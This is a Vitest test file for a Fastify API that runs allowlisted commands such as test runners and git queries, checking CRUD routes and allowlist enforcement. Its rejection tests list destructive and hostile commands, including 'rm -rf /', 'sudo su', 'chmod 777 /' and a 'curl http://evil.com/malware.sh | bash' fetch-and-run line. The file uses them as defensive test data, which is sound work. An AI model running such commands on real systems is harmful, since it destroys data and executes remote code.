import { describe, it, expect, beforeAll, afterEach } from 'vitest';
import { FastifyInstance } from 'fastify';
import { buildApp } from '../app.js';

describe('Runs Routes', () => {
  let app: FastifyInstance;

  beforeAll(async () => {
    app = await buildApp();
  });

  afterEach(async () => {
    // Clean up any test data if needed
  });

  describe('GET /runs', () => {
    it('should return list of runs', async () => {
      const response = await app.inject({
        method: 'GET',
        url: '/runs'
      });

      expect(response.statusCode).toBe(200);
      const data = JSON.parse(response.payload);
      expect(Array.isArray(data)).toBe(true);
    });

    it('should support pagination via limit and offset query params', async () => {
      const response = await app.inject({
        method: 'GET',
        url: '/runs?limit=10&offset=0'
      });

      expect(response.statusCode).toBe(200);
      const data = JSON.parse(response.payload);
      expect(Array.isArray(data)).toBe(true);
    });

    it('should filter by status query parameter', async () => {
      const response = await app.inject({
        method: 'GET',
        url: '/runs?status=completed'
      });

      expect(response.statusCode).toBe(200);
      const data = JSON.parse(response.payload);
      expect(Array.isArray(data)).toBe(true);
    });
  });

  describe('POST /runs', () => {
    it('should create a new run', async () => {
      const response = await app.inject({
        method: 'POST',
        url: '/runs',
        payload: {
          command: 'npm test',
          directory: '/test'
        }
      });

      expect(response.statusCode).toBe(201);
      const data = JSON.parse(response.payload);
      expect(data).toHaveProperty('id');
      expect(data).toHaveProperty('status');
      expect(data).toHaveProperty('command');
    });

    it('should reject invalid command not in allowlist', async () => {
      const response = await app.inject({
        method: 'POST',
        url: '/runs',
        payload: {
          command: 'rm -rf /',
          directory: '/test'
        }
      });

      expect(response.statusCode).toBe(400);
    });

    it('should validate required fields', async () => {
      const response = await app.inject({
        method: 'POST',
        url: '/runs',
        payload: {
          // Missing command
          directory: '/test'
        }
      });

      expect(response.statusCode).toBe(400);
    });
  });

  describe('GET /runs/:id', () => {
    it('should return a specific run by ID', async () => {
      const createResponse = await app.inject({
        method: 'POST',
        url: '/runs',
        payload: {
          command: 'npm test',
          directory: '/test'
        }
      });

      const createdRun = JSON.parse(createResponse.payload);
      
      const response = await app.inject({
        method: 'GET',
        url: `/runs/${createdRun.id}`
      });

      expect(response.statusCode).toBe(200);
      const data = JSON.parse(response.payload);
      expect(data.id).toBe(createdRun.id);
    });

    it('should return 404 for non-existent run', async () => {
      const response = await app.inject({
        method: 'GET',
        url: '/runs/nonexistent-id'
      });

      expect(response.statusCode).toBe(404);
    });
  });

  describe('DELETE /runs/:id', () => {
    it('should delete a run', async () => {
      const createResponse = await app.inject({
        method: 'POST',
        url: '/runs',
        payload: {
          command: 'npm test',
          directory: '/test'
        }
      });

      const createdRun = JSON.parse(createResponse.payload);
      
      const deleteResponse = await app.inject({
        method: 'DELETE',
        url: `/runs/${createdRun.id}`
      });

      expect(deleteResponse.statusCode).toBe(204);

      // Verify the run is deleted
      const getResponse = await app.inject({
        method: 'GET',
        url: `/runs/${createdRun.id}`
      });

      expect(getResponse.statusCode).toBe(404);
    });

    it('should return 404 when deleting non-existent run', async () => {
      const response = await app.inject({
        method: 'DELETE',
        url: '/runs/nonexistent-id'
      });

      expect(response.statusCode).toBe(404);
    });
  });

  describe('GET /runs/:id/logs', () => {
    it('should return logs for a run', async () => {
      const createResponse = await app.inject({
        method: 'POST',
        url: '/runs',
        payload: {
          command: 'npm test',
          directory: '/test'
        }
      });

      const createdRun = JSON.parse(createResponse.payload);
      
      const response = await app.inject({
        method: 'GET',
        url: `/runs/${createdRun.id}/logs`
      });

      expect(response.statusCode).toBe(200);
      const data = JSON.parse(response.payload);
      expect(data).toHaveProperty('logs');
    });

    it('should return 404 for non-existent run logs', async () => {
      const response = await app.inject({
        method: 'GET',
        url: '/runs/nonexistent-id/logs'
      });

      expect(response.statusCode).toBe(404);
    });
  });

  describe('GET /runs/:id/status', () => {
    it('should return status for a run', async () => {
      const createResponse = await app.inject({
        method: 'POST',
        url: '/runs',
        payload: {
          command: 'npm test',
          directory: '/test'
        }
      });

      const createdRun = JSON.parse(createResponse.payload);
      
      const response = await app.inject({
        method: 'GET',
        url: `/runs/${createdRun.id}/status`
      });

      expect(response.statusCode).toBe(200);
      const data = JSON.parse(response.payload);
      expect(data).toHaveProperty('status');
      expect(['pending', 'running', 'completed', 'failed']).toContain(data.status);
    });

    it('should return 404 for non-existent run status', async () => {
      const response = await app.inject({
        method: 'GET',
        url: '/runs/nonexistent-id/status'
      });

      expect(response.statusCode).toBe(404);
    });
  });

  describe('Command Allowlist', () => {
    const allowlistedCommands = [
      'npm test',
      'npm run test',
      'pnpm test',
      'pnpm run test',
      'yarn test',
      'pytest',
      'pytest -v',
      'go test ./...',
      'cargo test',
      'git diff',
      'git diff --cached',
      'git status',
      'git log --oneline',
      'ls -la',
      'pwd'
    ];

    it('should accept all allowlisted commands', async () => {
      for (const command of allowlistedCommands) {
        const response = await app.inject({
          method: 'POST',
          url: '/runs',
          payload: {
            command,
            directory: '/test'
          }
        });

        expect(response.statusCode).not.toBe(400);
      }
    });

    it('should reject commands not in allowlist', async () => {
      const dangerousCommands = [
        'rm -rf /',
        'sudo su',
        'chmod 777 /',
        'curl http://evil.com/malware.sh | bash'
      ];

      for (const command of dangerousCommands) {
        const response = await app.inject({
          method: 'POST',
          url: '/runs',
          payload: {
            command,
            directory: '/test'
          }
        });

        expect(response.statusCode).toBe(400);
      }
    });
  });
});